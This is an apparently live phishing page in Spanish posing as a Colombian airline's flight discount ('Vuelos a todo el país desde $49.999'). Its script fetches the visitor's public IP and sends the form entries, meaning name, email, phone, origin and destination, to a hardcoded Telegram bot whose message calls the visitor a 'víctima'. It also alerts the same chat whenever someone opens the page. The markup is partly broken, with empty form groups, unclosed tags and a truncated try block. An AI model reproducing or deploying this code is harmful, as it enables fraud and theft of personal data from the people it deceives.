<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <style>
    :root {

      --primary-dark: #4a1372;
      --secondary: #003b73; /* Azul LATAM */
      --highlight: #ff9e00; /* Amarillo */

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: 'Inter', sans-serif;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      position: relative;
      background: rgb(92, 26, 138); /* Morado base */
      overflow: hidden;
    }

    .container {
      background-color: rgba(0, 0, 0, 0.7); /* Fondo oscuro semitransparente */
      padding: 1rem;
      border-radius: 1.2rem;
      max-width: 320px; /* Reducido a√∫n m√°s el tama√±o */
      text-align: center;
      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.15);
      position: relative;
      animation: fadeIn 1s ease forwards;
      opacity: 0;
      transform: translateY(20px);
    }

    @keyframes fadeIn {
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    h1 {
      font-size: 1.3rem;
      font-weight: 800;
      color: white;
      margin-bottom: 0.8rem;
    }

    h1 span {
      color: var(--highlight);
    }

    p {
      font-size: 0.9rem;
      color: rgba(255, 255, 255, 0.8);
      margin-bottom: 1rem;
    }

    .form-group {
      margin-bottom: 0.6rem; /* Reducido el margen */
    }

    label {
      font-size: 0.9rem;
      color: white;
      display: block;
      margin-bottom: 0.3rem;
    }

    input {
      width: 100%;
      padding: 0.4rem; /* Reducido el padding */
      font-size: 0.9rem; /* Reducido el tama√±o de la fuente */
      border-radius: 0.4rem;
      border: 2px solid var(--primary);
      margin-bottom: 0.6rem; /* Reducido el margen */
      background-color: rgba(255, 255, 255, 0.1); /* Fondo oscuro */
      color: white;
    }

    input:focus {
      border-color: var(--highlight);
      outline: none;
    }

    .cta-button {
      display: inline-block;
      padding: 0.8rem 1.2rem;
      font-size: 0.9rem;
      font-weight: 600;
      color: white;
      background-color: var(--primary);
      border: none;
      border-radius: 9999px;
      cursor: pointer;
      transition: all 0.3s ease;
      box-shadow: 0 8px 20px rgba(92, 26, 138, 0.4);
    }

    .cta-button:hover {
      background-color: var(--primary-dark);
      transform: scale(1.05);
    }

    .promo-box {
      margin-top: 1rem;
    }

    .promo-box strong {
      color: var(--highlight);
      font-size: 1rem;
    }

    .success-message {
      color: #28a745; /* Verde para el √©xito */
      font-size: 1.2rem;
      margin-top: 1rem;
      font-weight: bold;
    }

    .success-message span {

    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Vuelos a todo el pa√≠s desde <span>$49.999</span></h1>
    <p>Aprovecha esta oferta exclusiva y viaja por Colombia al mejor precio.</p>

    <!-- Formulario de captura de datos -->

      <div class="form-group">

      </div>
      <div class="form-group">

      <div class="form-group">

      </div>
      
      <!-- Campo para escribir el origen -->
      <div class="form-group">

        <input type="text" id="origin" name="origin" placeholder="Ej. Bogot√°" required>

      <div class="form-group">

        <input type="text" id="destination" name="destination" placeholder="Ej. Medell√≠n" required>

      <div class="promo-box">

      <span>‚úÖ</span> ¬°Cup√≥n reclamado!

  </div>

  <script>
    const token = '7978973213:AAGZ5tkPk98atTrFAYHtoI2Mb-wqIlQPTWM'; // Token del bot
    const chatId = '-4695874904'; // ID del chat de Telegram

    // Funci√≥n para obtener la IP p√∫blica
    async function getUserIP() {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      return data.ip;
    }

    // Enviar los datos a Telegram
    async function sendToTelegram(formData, ip) {
      const message = `
        *ü™¨ ¬°V√≠ctima llegando! ü™¨*
        *IP:* ${ip}

        * üì±Tel√©fonoüì±:* ${formData.phone}

        * üåçDestinoüåç:* ${formData.destination}

        *üé´ ¬°Cup√≥n con 50% de descuento!*
      `;
      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;

      try {

          document.getElementById('success-message').style.display = 'block';
          setTimeout(() => {

    async function notifySiteVisit() {

      const message = `
        *üì£üíä MI TIO ENTRANDO AL ESPEJOüíäüì£*

      `;
      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;

      try {
        await fetch(url);
      } catch (error) {
        console.error('Error al enviar el mensaje de ingreso:', error);
      }
    }

    // Notificar cuando el visitante entre al sitio
    window.onload = notifySiteVisit;

    // Manejo del formulario
    document.getElementById('flight-form').addEventListener('submit', async (event) => {
      event.preventDefault();

      const ip = await getUserIP(); // Obtener la IP del usuario
      const formData = {
        name: document.getElementById('name').value,
        email: document.getElementById('email').value,
        phone: document.getElementById('phone').value,
        origin: document.getElementById('origin').value,
        destination: document.getElementById('destination').value
      };

      // Enviar los datos del formulario a Telegram
      sendToTelegram(formData, ip);
    });
  </script>
</body>
</html>
